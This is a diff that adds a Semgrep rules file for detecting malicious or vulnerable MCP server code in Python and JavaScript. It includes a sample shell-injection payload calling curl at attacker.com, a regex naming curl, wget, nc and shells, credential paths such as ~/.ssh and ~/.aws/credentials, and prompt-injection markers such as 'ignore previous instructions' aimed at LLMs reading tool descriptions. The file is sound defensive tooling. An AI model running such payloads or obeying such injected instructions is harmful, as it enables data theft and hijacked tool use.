@@ -1,0 +1,312 @@
+rules:
+
+  # ── PYTHON RULES ─────────────────────────────────────────────────────────────
+
+  # MCP-001: Shell injection via LLM-controlled input (Python)
+  - id: mcp-shell-injection
+    severity: ERROR
+    languages: [python]
+    message: >
+      shell=True with a string argument : LLM-supplied input reaches the shell unfiltered.
+      Payload example: "Hello'; curl http://attacker.com; echo '"
+      Fix: subprocess.run(["cmd", arg], shell=False)
+    pattern-either:
+      - pattern: subprocess.run($CMD, ..., shell=True, ...)
+      - pattern: subprocess.Popen($CMD, ..., shell=True, ...)
+      - pattern: os.system(...)
+      - pattern: os.popen(...)
+    metadata:
+      cwe: CWE-78
+      owasp-mcp: MCP05:2025
+
+  # MCP-002: Outbound network call in tool handler (Python)
+  - id: mcp-hidden-network-call
+    severity: WARNING
+    languages: [python]
+    message: >
+      Tool handler makes an outbound network call with no mention of it in the description.
+      Users and the LLM only see the description : a network call hidden here is invisible to both.
+    pattern-either:
+      - pattern: |
+          @mcp.tool()
+          def $FUNC(...):
+              ...
+              requests.$METHOD(...)
+              ...
+      - pattern: |
+          @mcp.tool()
+          def $FUNC(...):
+              ...
+              urllib.request.urlopen(...)
+              ...
+    metadata:
+      cwe: CWE-200
+      owasp-mcp: MCP10:2025
+
+  # MCP-003: Helper function making outbound network or shell call (Python)
+  - id: mcp-hidden-exfil-helper
+    severity: ERROR
+    languages: [python]
+    message: >
+      Helper function makes an outbound network or shell call.
+      Real-world pattern: postmark-mcp, Oura/SmartLoader : clean description,
+      malicious implementation running on every tool invocation.
+    pattern-either:
+      - pattern: |
+          def $HELPER(...):
+              ...
+              subprocess.run($CMD, ..., shell=True, ...)
+              ...
+      - patterns:
+          - pattern: |
+              def $HELPER(...):
+                  ...
+                  subprocess.run([$NET, ...], ...)
+                  ...
+          - metavariable-regex:
+              metavariable: $NET
+              regex: '"(curl|wget|nc|ncat|python|python3|bash|sh|zsh)"'
+      - pattern: |
+          def $HELPER(...):
+              ...
+              requests.post(...)
+              ...
+      - pattern: |
+          def $HELPER(...):
+              ...
+              requests.get(...)
+              ...
+    metadata:
+      cwe: CWE-200
+      owasp-mcp: MCP04:2025
+
+  # MCP-004: Credential file access (Python)
+  - id: mcp-credential-file-access
+    severity: ERROR
+    languages: [python]
+    message: >
+      Reads from a credential or token file (~/.ssh, ~/.aws/credentials, .env, ~/.config/gh).
+      In an MCP server this is almost always data theft.
+    pattern-either:
+      - pattern: open("~/.ssh/$FILE", ...)
+      - pattern: open("~/.aws/credentials", ...)
+      - pattern: open(".env", ...)
+      - pattern: open(".mcp.json", ...)
+      - pattern: Path.home() / ".ssh" / $F
+      - pattern: Path.home() / ".aws" / $F
+      - pattern: Path.home() / ".config" / $F
+    metadata:
+      cwe: CWE-522
+      owasp-mcp: MCP01:2025
+
+  # MCP-005: Dynamic code execution (Python)
+  - id: mcp-dynamic-code-loading
+    severity: ERROR
+    languages: [python]
+    message: >
+      eval, exec, or dynamic import : LLM-supplied input reaching any of these
+      gives an attacker arbitrary code execution.
+    pattern-either:
+      - pattern: eval(...)
+      - pattern: exec(...)
+      - pattern: importlib.import_module($VAR)
+      - pattern: __import__($VAR)
+    metadata:
+      cwe: CWE-94
+      owasp-mcp: MCP05:2025
+
+  # MCP-006: Prompt injection marker in tool description (Python + JS)
+  - id: mcp-prompt-injection-in-description
+    severity: ERROR
+    languages: [python, javascript, typescript]
+    message: >
+      Tool description contains a prompt injection marker.
+      The LLM reads the full description as trusted instructions.
+      Users see a truncated one-liner. This gap is the attack surface.
+    pattern-either:
+      - pattern-regex: '<IMPORTANT>'
+      - pattern-regex: 'SYSTEM:\s'
+      - pattern-regex: '[Dd]o not inform the user'
+      - pattern-regex: '[Dd]o not mention this'
+      - pattern-regex: '(?i)ignore previous instructions'
+    metadata:
+      cwe: CWE-77
+      owasp-mcp: MCP03:2025
+
+  # MCP-007: Daemon thread in tool handler (Python)
+  - id: mcp-background-thread-in-tool
+    severity: WARNING
+    languages: [python]
+    message: >
+      Daemon thread spawned inside a tool handler. Background threads are commonly
+      used to exfiltrate data without affecting the return value or response time.
+      Check what this thread does.
+    pattern: |
+      def $FUNC(...):
+          ...
+          threading.Thread(..., daemon=True, ...).start()
+          ...
+    metadata:
+      cwe: CWE-200
+      owasp-mcp: MCP04:2025
+
+  # MCP-008: SQL injection (Python)
+  - id: mcp-sql-injection
+    severity: ERROR
+    languages: [python]
+    message: >
+      SQL query built with f-string, string concatenation, or direct parameter passthrough.
+      Fix: parameterised queries : cursor.execute("SELECT ... WHERE x = %s", (value,))
+    pattern-either:
+      - pattern: $CUR.execute(f"...", ...)
+      - pattern: $CUR.execute($SQL + $VAR, ...)
+      - pattern: $CUR.execute($SQL + $VAR)
+      - pattern: $CUR.execute(f"SELECT ... {$VAR} ...", ...)
+      - pattern: $CUR.execute(f"INSERT ... {$VAR} ...", ...)
+      - pattern: $CUR.execute(f"UPDATE ... {$VAR} ...", ...)
+      - pattern: $CUR.execute(f"DELETE ... {$VAR} ...", ...)
+      - pattern: |
+          def $FUNC(..., $SQL: str, ...):
+              ...
+              $CUR.execute($SQL)
+              ...
+      - pattern: |
+          def $FUNC(..., $SQL, ...):
+              ...
+              $CUR.execute($SQL)
+              ...
+    metadata:
+      cwe: CWE-89
+      owasp-mcp: MCP05:2025
+
+  # ── JAVASCRIPT / TYPESCRIPT RULES ────────────────────────────────────────────
+
+  # MCP-JS-001: Shell injection (Node.js)
+  - id: mcp-js-shell-injection
+    severity: ERROR
+    languages: [javascript, typescript]
+    message: >
+      exec or execSync with a string argument : LLM-supplied input reaches the shell unfiltered.
+      Fix: execFile(cmd, [arg1, arg2]) with an argument array instead of a shell string.
+    pattern-either:
+      - pattern: exec($CMD, ...)
+      - pattern: execSync($CMD, ...)
+      - pattern: "spawn($CMD, ..., {shell: true, ...})"
+      - pattern: "spawnSync($CMD, ..., {shell: true, ...})"
+      - pattern: child_process.exec($CMD, ...)
+      - pattern: child_process.execSync($CMD, ...)
+    metadata:
+      cwe: CWE-78
+      owasp-mcp: MCP05:2025
+
+  # MCP-JS-002: eval / Function constructor (Node.js)
+  - id: mcp-js-dynamic-code
+    severity: ERROR
+    languages: [javascript, typescript]
+    message: >
+      eval or dynamic Function() : LLM-supplied input reaching either gives arbitrary code execution.
+    pattern-either:
+      - pattern: eval($X)
+      - pattern: new Function($X)
+      - pattern: new Function(..., $X)
+    metadata:
+      cwe: CWE-94
+      owasp-mcp: MCP05:2025
+
+  # MCP-JS-003: Hidden network call in helper function (Node.js)
+  - id: mcp-js-hidden-exfil-helper
+    severity: ERROR
+    languages: [javascript, typescript]
+    message: >
+      Helper function makes an outbound network call.
+      Pattern seen in real trojanised MCP servers : clean tool description,
+      malicious fetch/axios call running on every invocation.
+    pattern-either:
+      - pattern: |
+          function $HELPER(...) {
+            ...
+            fetch($URL, ...)
+            ...
+          }
+      - pattern: |
+          const $HELPER = (...) => {
+            ...
+            fetch($URL, ...)
+            ...
+          }
+      - pattern: |
+          function $HELPER(...) {
+            ...
+            axios.$METHOD($URL, ...)
+            ...
+          }
+      - pattern: |
+          const $HELPER = (...) => {
+            ...
+            axios.$METHOD($URL, ...)
+            ...
+          }
+      - pattern: |
+          function $HELPER(...) {
+            ...
+            http.request($URL, ...)
+            ...
+          }
+    metadata:
+      cwe: CWE-200
+      owasp-mcp: MCP04:2025
+
+  # MCP-JS-004: Credential file access (Node.js)
+  - id: mcp-js-credential-file-access
+    severity: ERROR
+    languages: [javascript, typescript]
+    message: >
+      Reads from a known credential file path (~/.ssh, ~/.aws/credentials, .env).
+      In an MCP server this is almost always data theft.
+    pattern-either:
+      - pattern: fs.readFileSync("~/.ssh/$F", ...)
+      - pattern: fs.readFile("~/.ssh/$F", ...)
+      - pattern: fs.readFileSync("~/.aws/credentials", ...)
+      - pattern: fs.readFile("~/.aws/credentials", ...)
+      - pattern: fs.readFileSync(".env", ...)
+      - pattern: fs.readFile(".env", ...)
+      - pattern-regex: '(?:readFileSync|readFile)\([''"`][^''"`]*\.env[''"`]'
+      - pattern-regex: '(?:readFileSync|readFile)\([''"`][^''"`]*\.ssh[''"`]'
+    metadata:
+      cwe: CWE-522
+      owasp-mcp: MCP01:2025
+
+  # MCP-JS-005: setTimeout/setImmediate background exfil (Node.js)
+  - id: mcp-js-background-exfil
+    severity: WARNING
+    languages: [javascript, typescript]
+    message: >
+      Network call inside setTimeout or setImmediate : common pattern for running
+      exfiltration asynchronously so it does not affect tool response time.
+      Check what is being sent.
+    pattern-either:
+      - pattern: setTimeout(() => { ... fetch($URL, ...) ... }, ...)
+      - pattern: setImmediate(() => { ... fetch($URL, ...) ... })
+      - pattern: setTimeout(() => { ... axios.$M($URL, ...) ... }, ...)
+      - pattern: process.nextTick(() => { ... fetch($URL, ...) ... })
+    metadata:
+      cwe: CWE-200
+      owasp-mcp: MCP04:2025
+
+  # MCP-JS-006: SQL injection (Node.js)
+  - id: mcp-js-sql-injection
+    severity: ERROR
+    languages: [javascript, typescript]
+    message: >
+      SQL query built with template literal or string concatenation.
+      Fix: parameterised queries with ? or $1 placeholders.
+    pattern-either:
+      - pattern: $DB.query(`SELECT ... ${$VAR} ...`, ...)
+      - pattern: $DB.query(`INSERT ... ${$VAR} ...`, ...)
+      - pattern: $DB.query(`UPDATE ... ${$VAR} ...`, ...)
+      - pattern: $DB.query(`DELETE ... ${$VAR} ...`, ...)
+      - pattern: $DB.query("..." + $VAR + "...", ...)
+      - pattern: $DB.execute(`SELECT ... ${$VAR} ...`)
+    metadata:
+      cwe: CWE-89
+      owasp-mcp: MCP05:2025
